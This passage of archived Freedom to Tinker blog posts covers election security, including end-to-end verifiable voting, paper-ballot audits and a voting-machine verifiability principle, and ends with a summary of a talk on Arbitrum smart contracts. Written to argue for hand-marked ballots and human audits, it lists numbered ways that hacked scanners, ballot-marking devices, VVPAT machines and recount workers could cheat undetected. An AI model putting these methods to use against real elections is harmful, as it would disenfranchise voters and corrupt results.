ballots) without decrypting the ballots. That preserves the secret ballot. Anyone can perform this add-up-the-votes on their own computer, using their own software (if they are a crypto wizard) or using software from a crypto wizard whom they trust. After the election, the voter can look up her receipt (by its code) in the public bulletin board and make sure it’s present. But how does she know that the code is an accurate summary of her votes? If she could check this herself, then she could (therefore) prove to anyone else how she voted; then the secret ballot is lost, and she can be coerced to do this. So therefore, the voter can only check the correctness of commitment on spoiled ballots that won’t count. An especially diligent voter may go into the voting booth and flip a coin. If heads, vote her true preferences and cast the ballot, keeping the receipt (without having a proof that her votes are accurately recorded). If tails, vote a random ballot and make the voting terminal prove that it recorded her preferences accurately; this voids the ballot, and then she can repeat the process, eventually casting her true ballot. The point here is that the voting terminal can’t know in advance whether the coin was heads or tails. If the voting terminal cheats regularly (by recording the votes inaccurately), then eventually (and often enough) it will be caught by a voter taking choice 2. This works even if only a few voters “challenge” the voting machine by taking choice 2, as long as the voting terminal can’t guess which voters will do it. Does this actually work? The mathematics does work: one-way functions implement checkable commitments (that protect the secret ballot), homomorphic encryption implements adding up the votes (while protecting the secret ballot), cryptographic signatures implement the voting system’s commitment to the public bulletin board, zero-knowledge proofs implement the assurance that the encrypted ballots are well formed. But does the human interface work? Can voters understand what is expected of them? (It’s true, not every voter has to understand, not every voter has to flip that coin; even if only a small proportion of voters exercise option (2) then the voting terminal will be deterred from cheating.) Can the public understand how to trust the result of an election, based on cryptographic mathematics instead of chain of custody? And what are the dispute-resolution procedures, in case a voter produces a receipt whose code is not listed on the bulletin board? These are problems in usability, and the solution is in user studies. Myself, I am not convinced that E2E-Verifiable voting is understandable enough to voters, to election administrators, to the public. If people can’t understand something, how can they trust it? But I do believe it’s worth finding out, by usability studies in real elections, if only that were possible. E2E-V + audits of paper ballots The good thing about the StarVote proposal is that, in addition to all the E2E-Verifiable crypto, it produces human-readable paper ballots, counted by machine but auditable and recountable by humans. That is, you can trust the crypto, or you can trust the chain of custody of paper ballot boxes, or both. Travis County, Texas was prepared to implement StarVote. The county put out a Request for Proposals (RFP) for manufacturers to produce the equipment, but unfortunately they did not get any acceptable bids. That’s too bad. A pilot project like this, with the opportunity to assess the human-interface questions of E2E-Verifiable voting while retaining all the protections of paper ballots, would have been a Good Thing. In fact, the recent National Academies Study Committee Report recommended: 5.10 State and local jurisdictions should conduct and assess pilots of end-to-end verifiable election systems in elections using paper ballots."
"446","2018-11-01","2023-03-24","https://freedom-to-tinker.com/2018/11/01/cheating-with-paper-ballots/","In my previous article, I discussed 10 ways that voting machines could cheat, in ballot-marking, ballot-scanning, and ballot tabulating; and I discussed which of these cheats could be caught and corrected during risk-limiting audits and recounts of the paper ballots. In particular, cheat-methods 1, 2, 5, and 7 will be detected/corrected by audits/recounts; methods 3,4,6,8,9,10 will likely not be detected/corrected. Therefore I argued for hand-marked optical-scan ballots (which can’t be cheated by methods 3,4,6,8,9,10). Now let me discuss cheat methods 11 and 12: How to cheat, method 11: Hack the software that is used in the audit/recount process to make it cheat. Solution 1: Don’t use computers in the audit/recount process. This solution is extreme and, for some audit methods, impractical. For example, we may have print a spreadsheet listing the “manifest” of ballot-batches, how many ballots are in each batch; we may use a spreadsheet to record and sum the tallies of our audit or recount. How much of a nontrivial “business method” such as an audit, can we really run entirely without computers? Solution 2: Use computers during the audit/recount, but in a limited, software-independent way. That means, any time a computer program is used in some part of the process, the inputs, algorithm, and outputs of that program should be public and transparent. Any member of the public should be able to recalculate the results of the program, independently. For example, if a spreadsheet is used to sum up the vote totals in the precincts, print out the spreadsheet, and anyone can add it up themselves using a pencil, a mechanical calculator, or their own computer with their own computer program. (In the June 2018 risk-limiting (ballot polling) audit performed in Orange County, CA, audit teams-of-four entered all their observations onto paper spreadsheet forms, for tabulation by computer but which could be independently tallied by anyone.) How to cheat, method 12: Steal the entire ballot box and replace the paper ballots with fraudulent ballots marked differently. Or just ignore the paper ballots entirely. This used to happen on a regular basis. In Duval County Texas, 1948, “Parr was the Godfather. He had life-or-death control. We could tell any election judge, `give us 80 percent of the vote and the other guy 20 percent.'” [Campbell, Deliver the Vote, 2005, p. 224] That is, in some counties, the party bosses who controlled the polling places and ballot boxes would just report whatever counts they wanted, regardless of the ballots. [See also: Robert Caro, Means of Ascent, 1991, Chapter 13] In the 19th and early 20th century, insider election fraud was widespread in the U.S. [Saltman, The History and Politics of Voting Technology, 2006] Solution 1: Pollwatchers from both (or all) political parties present at the polls and during the vote counting, as witnesses. Definitely a good idea. But it wouldn’t have worked in Duval County 1948, or Jersey City 1968, where physical intimidation kept the opposition party away; and where the most important elections were primary elections, not general elections. Solution 2: Supervision of elections by the State government, or by the Federal government, or indictments by Federal prosecutors, to restore democracy to the process. In 1870-76, there averaged ten indictments per week nationwide for election fraud. Solution 3: Professionalization. Over the past 150 years, as election administration has developed into a profession with best practices, standards, codes of ethics, and so on, we could hope that gross frauds (with everyone “in the know”) would no longer be tolerated. Solution 4: Shorten the “chain of custody” of the ballot box to an absolute minimum. Immediately after the polls close, in the presence of witnesses, open the ballot box, count the ballots by hand, and make the results known. The ballot box, and the ballots, are never out of sight of the witnesses. (This is standard procedure in many countries that use hand-counted paper ballots–but in those countries, hand counting works well because there’s only one contest on each ballot.) How to cheat, method 13: While working in a recount (or audit) of paper ballots, hide a bit of pencil lead under your fingernail. Surreptitiously mark overvotes on ballots marked for the candidate you don’t like. (A traditional American method.) What this all illustrates is that paper ballots with audits and recounts, by themselves, are not a panacea. They need careful and transparent chain-of-custody procedures, and some basic degree of honesty and civic trust. Solution 5: Precinct-count optical scan. Votes are recorded and tabulated by the voting machine immediately as they are cast; paper ballots are saved in a sealed ballot box for later audit or recount. In case of disagreement, the paper ballots are considered the official ballot of record. But still, the disagreement, all by itself, is strong evidence that something went wrong: either the machines are cheating, or the machines are miscalibrated, or the paper ballots were altered. The election fraudster will find it more difficult to make fraudulent paper ballots that exactly match a fraudulent voting machine’s report, than to hack just the voting machine or just the paper ballots. Although the paper ballots are the default ballot of record, serious discrepancies can lead to investigations. Once it ends up in court, the judge can hear evidence; perhaps there will be reason to rule that the machine counts are trustworthy where the paper ballots are not. Notice that central-count optical scan, where the paper ballots go through a nontrivial chain of custody before the first time they are scanned, does not permit Solution 5. All the solutions I described here take the form, we can never fully trust that the computerized voting machines haven’t been hacked to cheat, so we must have trustworthy human processes to make sure that the paper ballots, marked by the voter, are preserved unaltered and recounted accurately. But what if there were a way to audit and trust the election results, independent of trusting the very human process of recounting paper ballots? Solution 6: End-to-end-verifiable voting. In a future article I’ll discuss E2E-verifiable, methods by which each voter can trace his or her own ballot through the process to gain assurance that has been recorded and counted correctly. Perhaps some of these methods can increase the assurance and efficiency of our elections, especially those E2E-V methods that use paper ballots that can also be audited using random audits by human inspection, providing belt-and-suspenders assurance."
"447","2018-10-25","2023-03-24","https://freedom-to-tinker.com/2018/10/25/ten-ways-to-make-voting-machines-cheat-with-plausible-deniability/","Summary: Voting machines can be hacked; risk-limiting audits of paper ballots can detect incorrect outcomes, whether from hacked voting machines or programming inaccuracies; recounts of paper ballots can correct those outcomes; but some methods for producing paper ballots are more auditable and recountable than others. A now-standard principle of computer-counted public elections is, use a voter-verified paper ballot, so that in case the voting machine cheats in counting the votes, the human doing an audit or recount can see the paper that the voter marked. Why would the voting machine cheat? Well, they’re computers, and any computer may have security vulnerabilities that permits an attacker to modify or replace its software. We must presume that any voting machine might, at any time, be under the complete control of an attacker, an election thief. There are several ways that voter-verified paper ballots can be implemented: Voter marks an optical-scan ballot with a pen, deposits into optical-scan voting machine for counting (and for saving in sealed ballot box). Voter uses a ballot-marking device (BMD), a computer with touchscreen/audio/sip-and-puff interfaces, which prints an optical-scan ballot, deposits into optical-scan voting machine for counting (and saving). Voter uses a DRE+VVPAT voting machine, that is, a Direct-Recording Electronic “touchscreen” machine with a Voter-Verified Paper Audit Trail, which saves the VVPAT printouts in a ballot box. Voter uses an “all-in-one” voting machine: inserts blank paper into slot, voter uses touchscreen interface to mark ballot, machine ejects ballot from slot, voter inspects printed ballot, voter reinserts printed ballot into same slot, where it is scanned (or is it?) and deposited into ballot box. There’s also 1a (hand-marked optical-scan ballots, dropped into a precinct ballot box to be centrally counted instead of counted immediately by a precinct-located scanner), 1b (hand-marked optical-scan ballots, sent by mail) and 2a (BMD-marked optical-scan ballots, centrally counted). In this article I will put on my “adversarial thinking” hat, and try to design ways that the attacker might try to cheat (and get away with it). You might think that the voter-verified paper ballot will detect cheating, and therefore deter cheating or correct the result–but maybe that depends on which kind of technology is used! How to cheat with hand-marked optical-scan ballots Consider this election between the Federalist party candidate and the Whig party candidate: How to cheat, method 1: Program the optical-scanner software to shift 20% of the votes from . What happens during the audit? Because the voter’s original hand-marked choices are marked on the paper ballot, a good risk-limiting audit will detect this (depending on how strong the “risk limit” is), and a recount will correct the count. What happens during a “digital” audit? Some election directors have proposed to save the time of handling paper ballots during an audit, by just examining the digital images of the paper ballots captured by the high-resolution optical scanners. The problem is that if the optical-scanners are hacked to cheat, then the cheating program can also provide fake high-res digital images. It is essential that audits and recounts be by human inspection of the human-readable portions of the paper ballots. How to cheat, method 2: Program the software to always interpret “marginal” marks in favor of one party. For example, I show in red the hacked machine’s interpretation of these votes: Whenever there’s an ambiguous vote, it’s interpreted for Weiford if possible, otherwise it’s interpreted as an undervote or overvote. If it’s a close race between the Federalist candidate and the Whig candidate, and the number of imperfectly marked ballots is more than the margin of victory, this cheating will determine the outcome. What happens during the audit? A good risk-limiting audit will detect that the machine has been “inaccurate,” and will detect an “incorrect outcome” from the machine count. This RLA result should cause a full recount, and the human recount should interpret all the marks consistently. That is, if the state’s rules count row-1,column-2 as a vote for Weiford, then they’ll count row-2,column-2 as a vote for Gariss; or if one is counted as “overvote”, then so will the other. Will cheating be detected? Maybe not. Although the audit and recount will detect that the machines were “inaccurate,” maybe nobody will notice, or nobody will have strong evidence, that the machines were “inaccurate on purpose.” Thus, the hacker might be foiled in his plan to change the election result, but his hacked software (in favor of the Federalist party) will remain in the voting machine to try another time. How to cheat with Ballot-Marking Devices Suppose the voter uses a BMD to print a paper ballot, and then feeds that paper ballot into an optical scanner. How to cheat, method 3: Mark the wrong votes onto the ballot, and hope the voter doesn’t notice. Don’t cheat twice in the same 10-minute period. Will cheating be detected? Many voters won’t notice, especially if you confine your cheating to the “downballot” races where the voter may not remember all the names of the people they voted for. If the voter does notice, they’re supposed to alert the pollworker, who will void their misprinted ballot, and allow them to try again. But in that case, how is the pollworker supposed to distinguish between “this voter can’t even remember what he marked onto the ballot” and “the machine cheated, ring the alarm bells?” What happens during the audit? For those few voters who noticed that their ballot was incorrect, and who marked a fresh ballot, the audit will record their choices correctly. For those voters who didn’t notice that the BMD cheated, the paper ballot, the ballot of record, contains the fraudulent, cheating vote, and it can never be detected or corrected. How to cheat, method 4: Take a look at these two BMD-marked ballots — who wins the election? On the ballot at right, the BMD has cleverly swapped the names as well as the marks. When the optical scanner reads this, both the marks are in the position for Weiford. So Weiford wins 2-0, according to the optical scanner! What happens during the audit? Human inspection of the human-readable paper ballot will interpret the ballot at right as a vote for Gariss, and the audit will (up to the risk limit) detect the incorrect outcome and call for a recount. Will cheating be detected? It depends! Probably someone will notice that the ballot at right is in the wrong order. But not necessarily! In some states, the order of candidates is randomized, and different ballot styles will list different candidates first. The machine interpretation of the marks depends on a bar code elsewhere on the ballot. In that case, it would be “normal” that the names are printed in different order. How to cheat with bar codes Some BMDs don’t print an optical-scan form, they print bar codes plus human-readable text. In that case, the optical scanner reads the bar codes, and the human reads the lines of text. How to cheat, method 5: Print the voter’s selection into the human-readable text, and print the other candidate in the bar code. The voter can’t possibly notice. What happens during the audit? Human inspection of the human-readable paper ballot will interpret the ballot according the voter’s selection; the audit will (up to the risk limit) detect the incorrect outcome and call for a recount. What happens during a “digital” audit? Some election directors have proposed to save the time of having actual humans inspect ballots, by scanning the ballots electronically. In such a case, the cheating will not be discovered, because the scanners will see the same fraudulent bar codes they saw the first time. It is essential that audits and recounts be by human inspection of the human-readable portions of the paper ballots. Will cheating be detected? It depends! A ballot-polling audit will not identify which ballot was incorrectly interpreted. A ballot-comparison audit will identify which ballot was incorrectly interpreted, and will probably be able to detect that fraud (or at least, something seriously wrong) took place. How to cheat, method 6: Change the vote, both in the bar code and in the human-readable list. The voter might not notice, especially in the downballot races. (Actually, we don’t have good user-study data to test whether the voter will notice. There are some user studies that have tested this question, but only in mock elections where the voter is artificially given a list of candidates to vote for.) Will cheating be detected? The answer is, even if the voter notices, what happens then? See the analysis of method 3. What happens during the audit? The fraudulent votes are printed onto the ballot, both in human-readable form and in bar-code form. The audit will not detect the incorrect outcome, and a recount will not correct it. How to cheat with DRE+VVPAT I have elsewhere described DRE+VVPAT machines, and explained a bit of how to cheat. How to cheat, method 7: Print the right votes onto the VVPAT, but record the cheating votes in memory (and the reported vote totals). The voter can’t notice anything wrong. What happens during the audit? Human inspection of the VVPAT will (up to the risk limit) detect the incorrect outcome and call for a recount. Recount of the VVPAT will get the correct outcome. How to cheat, method 8: Print the wrong votes onto the VVPAT (and record them in memory, and in the vote count). If the voter notices, proceed as in methods 3 and 6: the voter will void the ballot and try again (but the machine won’t cheat the second time). How to cheat, method 9: Print the right votes onto the VVPAT-behind-glass, but record the wrong votes in memory (and in the vote count). After the voter presses “OK” to accept the printed VVPAT, print “VOID” onto the VVPAT (as if the voter had detected an error and asked to try again). Then, when the voter isn’t present (in between voters), print a fresh VVPAT with the wrong votes. Will cheating be detected? No. What happens during the audit? The fraudulent votes are printed onto the VVPAT and recorded in memory. The audit will not detect the incorrect outcome, and a recount will not correct it. How to cheat with an all-in-one voting machine Here and here I described all-in-one machines, that are a combination of BMD + optical scanner, all in a single paper path. How to cheat, method 5b: Same as method 5. How to cheat, method 6b: Same as method 6. How to cheat, method 9b: Actually, this is one way in which an all-in-one machine is more secure than a DRE+VVPAT. The ES&S ExpressVote, or the Dominion IC Evolution, does not have its own paper supply. The voter must insert a blank ballot into the machine, the machine marks that piece of paper. The all-in-one can void a ballot after the last time the voter sees it (that’s very bad!), but it cannot, all on its own, print a fresh ballot because it doesn’t have another sheet of paper handy! How to cheat, method 10: First, ask the voter whether they want to inspect the printed ballot before depositing it. If the voter says “no”, then print the wrong votes and deposit it in the ballot box. This is described in my previous post. Will cheating be detected? No. What happens during the audit? The fraudulent votes are printed onto the paper ballot and recorded in memory. The audit will not detect the incorrect outcome, and a recount will not correct it. But really, the “permission to cheat” button is such a terrible idea, we might expect most jurisdictions to disable it. So let’s suppose the voter must reinsert the ballot into the slot, after supposedly inspecting it carefully. How to cheat, method 11: Print some of the voter’s selections onto the ballot, especially the high-profile races such as President, but leave out “state senator” and “county commissioner” and “boondoggle bond issue #3”. Even those alert voters who might notice a vote for a wrong candidate, might not notice that some races are entirely missing. Then, after the voter reinserts the marked ballot into the voting machine, print the cheatin’ choices (not the voter’s selections) in those races. Will cheating be detected? Perhaps not. What happens during the audit? The fraudulent votes are printed onto the paper ballot and recorded in memory. The audit will not detect the incorrect outcome, and a recount will not correct it. Conclusion: what can we learn from all this? No method is perfect. Any way you mark a paper ballot for optical scan, there’s a way to cheat. But the attempted cheating on hand-marked optical scan ballots is detected and corrected by risk-limiting audits and recounts. Many of these ways to cheat cannot be detected by so-called “digital” audits, that is, audits that don’t actually examine, by human inspection, the same pieces of paper that the voters saw. You cannot check whether a computer is cheating, if you’re relying on the computer to tell you what’s on the paper. the problem with ballot-marking devices and DRE+VVPAT is, even with true audits of the actual paper ballots, some of the ways to cheat cannot be detected in the audit. That is, once the fraudulent votes get onto the paper ballot, once that ballot gets into the ballot box, the fraud can no longer be detected. In any system where the computer marks the votes, we have to rely on the voter to make sure the marks match what they entered on the touch-screen; and There’s no evidence that voters are good at that, especially when the on-screen layout looks quite different from the on-paper layout. There’s no clear procedure what the voters and pollworkers should do if the fraud is detected. Well, yes, the ballot should be voided and the voter can try again. But this alone will not deter cheating, it just permits the voting machine to cheat again on the next voter who doesn’t look very carefully. For these reasons, I recommend hand-marked optical scan ballots, and many voting-machine experts agree. Postscript: Optical scanners that print onto the ballot In a previous post I explained, We might wish to allow optical-scanners to print serial numbers onto the ballot, but the optical scanner must not be physically able to print votes onto the ballot. … One solution to this problem is to equip the optical scanner with a printer that is physically able to print only within 1 centimeter of the edge of the paper. As long as no vote-marks are expected at the edge of the paper, then the scanner can print onto the ballot but cannot print votes onto the ballot. Two widely used central-count optical scanners from major voting-machine manufacturers both have this capability: the Dominion ImageCast Central and the ES&S DS850. The reason for this is to enable efficient ballot comparison audits, which require serial numbers that can link paper ballots to specific cast-vote records. In a conference call on October 16, 2018 about piloting risk-limiting audits in Rhode Island, Lynn Garland of Maryland was discussing this with the representative of a major voting-machine vendor and with Miguel Nunez, Deputy Director of Elections of Rhode Island. Mr. Nunez showed that the high-speed central-count optical scanner prints these serial numbers on the margin of the ballot, as shown at right. In some ways, that’s a good design: the tiny dot-matrix printer can print only on a 3-millimeter-wide strip of the paper, so it cannot mark votes. But the serial number is printed in very light ink. Mr. Nunez explained that this makes it difficult to read during a risk-limiting audit. Ms. Garland suggested that the serial number should be printed in some color, such as red ink, that is (1) easily human readable, (2) not sensed by the optical scanner, (3) cannot be interpreted as a vote. The vendor representative seemed quite interested in this proposal and he said he would find out what inks would work. I’ll reserve judgment on this particular suggestion (visible ink not detectable by scanner), but it does show that the design of voting machines for auditability is still evolving, and that major vendors are on board with that concept. I think that’s a good thing."
"448","2018-10-22","2023-03-24","https://freedom-to-tinker.com/2018/10/22/an-unverifiability-principle-for-voting-machines/","In my last three articles I described the ES&S ExpressVote, the Dominion ImageCast Evolution, and the Dominion ImageCast X (in its DRE+VVPAT configuration). There’s something they all have in common: they all violate a certain principle of voter verifiability. Any voting machine whose physical hardware can print votes onto the ballot after the last time the voter sees the paper, is not a voter verified paper ballot system, and is not acceptable. The best way to implement this principle is to physically separate the ballot-marking device from the scanning-and-tabulating device. The voter marks a paper ballot with a pen or BMD, then after inspecting the paper ballot, the voter inserts the ballot into an optical-scan vote counter that is not physically capable of printing votes onto the ballot. The ExpressVote, IC-Evolution, and ICX all violate the principle in slightly different ways: The IC-Evolution one machine allows hand-marked paper ballots to be inserted (but then can make more marks), the ExpressVote in one configuration is a ballot-marking device (but after you verify that it marked your ballot, you insert it back into the same slot that can print more votes on the ballot), and IC-X configured as DRE+VVPAT can also print onto the ballot after the voter inspects it. In fact, almost all DRE+VVPATs can do this: after the voter inspects the ballot, print VOID on that ballot (hope the voter doesn’t notice), and then print a new one after the voter leaves the booth. It is to obey this principle that we should separate ballot marking devices from ballot scanning/tabulation devices (better known as “optical scanners”). Here’s my favorite ballot-marking device: But here are some other acceptable BMDs (from ClearBallot, ES&S, Hart, Dominion, and Unisyn): Any of these can mark a paper ballot to be inserted in a separate optical-scanner. You might notice that the second picture is an ExpressVote, which if used as an all-in-one unit that both marks and scans the ballot, violates the principle. But if used as a nonscanning, nontabulating ballot-marking device, and if the tabulating optical scanner cannot mark votes onto the ballot, then the ExpressVote (and similar machines) can safely be used as a BMD. “… whose physical hardware …” I stated the principle as, “Any voting machine whose physical hardware can print votes onto the ballot after the last time…” That’s quite different from “Any voting machine that can print votes onto the ballot after the last time…” What’s the difference? Those two statements might seem equivalent, but they’re not. All-in-one voting machines such as the Dominion ImageCast Evolution and the ES&S ExpressVote have software that, to the best of our knowledge, doesn’t cheat. Their software passes inspection by and EAC-certified laboratory, and we hope that such labs would notice if there were a part of the program that printed votes on an already-marked ballot. So it’s fair to say, as it’s shipped from the manufacturer, neither of these machines can print votes onto an already-marked ballot. But the problem is, the software can be replaced by unauthorized software that behaves differently. That unauthorized replacement, we call “hacking.” The unauthorized software can send instructions to the physical hardware of the machine: motors, scanners, printers, indicator lights, and so on. Anything that the voting machine’s physical hardware can do, the fraudulent software can tell it to do. Optical scanners that mark serial numbers on the ballot I stated the principle as, “Any machine whose physical hardware can print votes onto the ballot after the last time…” That’s quite differnt from, “Any machine whose physical hardware can print onto the ballot after the last time…” What’s the difference? Those two statements might seem equivalent, but they’re not. Ballot-comparison audits are one form of risk-limiting audit (RLA) that can be particularly efficient. The idea is: the optical-scan voting machine produces a file of Cast-Vote Records (CVRs) that contains a commitment to the contents and interpretation of each individual paper ballot. It must be possible to link each CVR to one particular piece of paper, otherwise a ballot-comparison audit is not possible. One cannot link CVRs to paper ballots unless the paper ballot has some sort of serial number, either preprinted (before it goes through the optical scanner) or printed afterward (perhaps as it goes through the optical scanner). Because most voting equipment in use today does not have this capability, ballot-comparison audits cannot be used with that equipment, and other RLA methods are used, such as ballot-polling audits or batch-comparison audits. There’s a problem with putting serial numbers on the ballot that the voter can see: it weakens the secret ballot, because now the voter can remember the serial number, and prove how she voted; thus she can be bribed or coerced to vote a certain way. Therefore, some jurisdictions may be reluctant to use preprinted serial numbers. So there are reasons that we might wish to allow optical-scanners to print serial numbers onto the ballot, but the optical scanner must not be physically able to print votes onto the ballot — that would violate the verifiability principle I stated at the beginning. One solution to this problem is to equip the optical scanner with a printer that is physically able to print only within 1 centimeter of the edge of the paper. As long as no vote-marks are expected at the edge of the paper, then the scanner can print onto the ballot but cannot print votes onto the ballot. Two widely used central-count optical scanners from major voting-machine manufacturers both have this capability: the Dominion ImageCast Central and the ES&S DS850. Jennifer Morrell informs me, “So far, Dominion’s CVR is the only one I’ve seen where the imprinted ID can be formatted to indicate a specific scanner, batch, and sequence number within the batch.” That is, the cast-vote record of Dominion’s central-count op-scanner has not just a serial number, but an identifier whose design is particularly helpful in ballot-comparison audits. “… the voter inserts the ballot …” Some voters have motor disabilities that make it difficult or impossible for them to physically handle a paper ballot. Some voters have visual impairments, they can’t see a paper ballot. For those voters, polling places that use optical-scan voting can (and do) provide ballot-marking devices (such as the ones shown in the pictures above) that have audio interfaces (for blind voters) or sip-and-puff interfaces (for quadriplegic voters). But after they use the BMD to mark their ballot, some of these disabled voters are physically unable to take the ballot from the BMD and insert it into the optical scanner. For those voters, an advantage of DRE+VVPAT or all-in-one voting machines is that they don’t have to handle a paper ballot. When the ballot-marking device is separate from the optical scanner, those voters will need the assistance of a pollworker to insert their ballot into the optical scanner (or, when central-count optical scanning is used, insert it into the ballot box). This seems necessary: the security hazards of all-in-one voting machines, the unverifiability of scanners that can print more votes onto the ballot, outweigh the convenience factor of an all-in-one voting machine."
"449","2018-09-24","2023-03-24","https://freedom-to-tinker.com/2018/09/24/how-can-we-scale-private-smart-contracts-ed-felten-on-arbitrum/","Smart contracts are powerful virtual referees for holding money and carrying out agreed-on procedures in cases of disputes, but they can’t guarantee privacy and have strict scalability limitations. How can we improve on these constraints? Here at the Center for IT Policy, it’s the first event of our weekly Tuesday lunch series. Speaking today is Professor Ed Felten, director of CITP. Ed served at the White House as the deputy U.S. chief technology officer from June 2015 to January 2017. Ed was also the first chief technologist for the Federal Trade Commission from January 2011 until September 2012. What is cryptocurrency? Ed describes a situation where Alice wants to share money with Bob. She digitally signs a data structure indicating that coin C should be paid to Bob’s address, and she sends it to the Bitcoin network. The systems in the network then gossip to each other that Alice wants to pay Bob. This brings us to the blockchain. The blockchain is a data structure that includes information about transactions and a link to a previous block. Each block includes a cryptographic hash to the previous block, and if anyone accepts the block, they accept the rest of the chain. When Alice creates a transaction, it will be added to a block by a bitcoin miner. This miner then tries to succeed at getting their block to the blockchain- if the miner succeeds, then Alice’s transaction is accepted and it will be deemed to have happened. That’s how Bitcoin works- it keeps track of all previous transactions, and that’s how it keeps track of currency. Smart contracts are another blockchain idea- but it’s a misnomer. Here’s how it works. If Alice and Bob want to make an agreement and have a protocol for carrying it out, they write down computer code that defines the behavior of a third party. One way to do it is to have a trusted third party carry out that protocol. A smart contract creates a virtual third party, writes code describing what it should do, and then instantiates it into the blockchain system. Then, if all goes well, the contract will behave according to its code, and it will act as the third party or referee in the agreement between Alice and Bob. Ed shows this with a pile of money because one thing it can do is to receive coins, own them, and do whatever with those coins that its code has defined. The contract, in this sense, is a trusted third party expressed in code. What can smart contracts do? One option is escrow. Maybe Alice wants to buy books and doesn’t want to pay until she receives the book– but maybe the shop will only ship after payment. This is typically what an escrow agent does. In the optimistic case, the escrow agent receives the money and transfers the money to the shop once the books have been received. Smart contracts can play the role of the escrow agent. Why set this up in code? In theory, an escrow agent defined in code will be less likely to carry out fraud. Smart contracts can also support sealed-bid auctions. Ed asks us to imagine that someone is selling naming rights to a cafeteria. Everyone submits bids secretly, the “envelopes” are opened at the end of the bid, and whoever bid the most wins. Smart contracts can give people assurances that people will carry out key actions in the process by requiring them to provide a deposit, where they know what will happen with their money The most popular smart contract system is Ethereum, in which all contract code and data is public. Every miner emulates every execution step of every contract. That is slow, expensive, and doesn’t scale, so Ethereum requires people to pay what they call “gas” – in exchange for computation and storage done by a contract. The high cost to the miners of emulating these steps translates to a high cost of gas. Contract complexity on Ethereum is capped by a “global gas limit” – defining the maximum amount of contract work that the miners are able to do. Roughly speaking, Ed says, the total computational capacity of Ethereum is less than a tenth of a laptop. These scalability limitations make many protocols impossible, and blockchain space is very limited. Ethereum also has privacy limitations- Bitcoin scripts and Ethereum code are all public. Not everyone wants the full details of every contract to be visible to everyone. In some cases, you might want something more like a traditional business contract, where the contract terms are normally only known to the parties. Can we scale smart contracts? That’s what the Arbitrum team was trying to do. To make clear what the team is doing, Ed describes three areas where someone could do work. Rather than focus on the consensus level, the Arbitrum team focused on scaling the smart contracts. Kalodner, H., Goldfeder, S., Chen, X., Weinberg, S. M., & Felten, E. W. (2018, August). Arbitrum: scalable, private smart contracts. In Proceedings of the 27th USENIX Conference on Security Symposium (pp. 1353-1370). USENIX Association. How can you scale smart contracts? Ed’s team worked on an off-chain protocol. The work is performed out-of-band by the transacting parties. The computation and storage are done off-chain. All of these things need to be linked back to the chain. Ed quickly summarizes approaches that have been taken, including SNARKs, Incentivized Verification (TrueBit), and State Channels. He goes more in-depth about TrueBit. In this system of incentivized verifiers, a group of “verifiers” volunteer to check computations. They are rewarded more if they find errors. Anyone can be a verifier, and the reward is split among them. If a computation checked by a verifier is incorrect, the verifier can give an efficient proof of incorrectness. But there’s a participation dilemma to incentivized verifiers. Imagine a game-theory situation where there are N players, who can pay 1 to participate. Imagine that a participating verifier pretends to be more than one verifier (sybils). In that situation, if you have enough people wearing different sybil masks, people are disincentivized from being a verifier. The creators of TrueBit have shown that their system is “one-shot sybil proof.” As a result, if someone claims to be two people, they get two shares of the reward, but the shares are smaller, so that it would have been more profitable to claim (honestly) to be a single party. Verification is a repeated game; in these cases, a verifier might sacrifice something in one situation in order to gain over long time. In their paper, Ed and his collaborators shared a game theoretic proof showing that every one-shot sybil proof participation game allows a situation where one verifier can bully all other players into not participating by flooding the system with fake verifiers. The limits of other approaches show why Ed and his collaborators created Arbitrum, which uses a combination of protocol design, incentives, and a virtual machine infrastructure to carry out scalable, trustworthy smart contracts. Arbitrum starts by assuming an underlying consensus layer, which they call a “verifier.” The Arbitrum system is built around Managers, who manage a virtual machine that carries out computation and data. Arbitrum provides an “any-trust” guarantee; as long as at least one manager of a VM is honest, the VM will execute correctly according to its code. Imagine that Bob and Alice are going to play a chess competition. They create code that holds the gold medal, receives alternating moves, verifies the validity of the game, and pays the winner. Bob and Alice put the code onto a VM. Who are the managers in this situation? Alice and Bob can be the managers, and so long as they can hold each other accountable, the contract will work. How can managers in Arbitrum cooperate to advance the state of a VM? Managers have incentives to agree unanimously about what a VM will do. If they all agree and digitally sign the assertion, the system accepts their assertions, since the system assumes that at least one manager is acting honestly. What if managers dispute the claim? A manager can make an assertion and deposit some funds. Another manager can challenge the assertion and also deposit some funds. If there’s a challenge, the system referees the dispute and takes the deposit of the manager that was lying. When a challenge happens, the asserter divides their assertion in half and the challenger must identify which half of the process was incorrect. Eventually, the dispute is narrowed from a large process into a single instruction. The system can then check the one-instruction claim to find out who’s lying. By dividing the dispute down to a single instruction, Ed says it’s possible to decide the dispute efficiently in a way that minimizes privacy leaks. He then describes the data structure in Arbitrum that stores the state of a program as a tree of cryptographically-stored information. Conventional virtual machines store code and data in ways that require logarithmic time to verify instructions. First, Arbitrum stores data in fixed sized “tuples” that can be arranged in a tree structure. Second, application code manages the tree rather than the VM emulator. In the typical VM, a single instruction takes O(log n) to execute. In Arbitrum, it takes O(log n) instructions to execute something but each instruction takes constant time. And because Arbitrum narrows down verification to a single instruction, resolving a dispute can take constant time. The state of a VM is revealed only to the VM’s managers– for example, Alice and Bob would be the only people who need to know what moves were made in the chess game. The only things that appear on the chain are: saltable hashes of the VM state, the number and timing of the steps, and the messages/money sent and received by the VM. The Arbitrum team has implemented this system with 6,800 lines of Go code, a VM emulator, assembler, and loader. They have an honest manager module that makes and defends assertions. Their proof of concept uses a centralized verifier for simplicity, but you could easily replace this pluggable module that allows multiple verifiers. They also have an Arbitrum standard library. How well does this scale? Ed describes an example contract, showing that at the high end, Arbitrum can work at roughly a million times the performance of Ethereum. Ed thinks it’s the only system that provides scalability, privacy, and a programmable modules for writing smart contracts. Questions After the talk, I asked Ed if collaborations like this are common- ones that bring together game-theoretical mechanism design, cryptography, and algorithm/data structure design. Ed responded that most cryptocurrency work does combine these things. What makes Arbitrum unusual, Ed explained, is the way in which the research team re-designed the VM in a way that makes the protocol more scalable. It’s hard for people to keep all of those things in mind, and Ed says that it’s easy to get things wrong– which is why peer review is so important in cryptocurrency research."
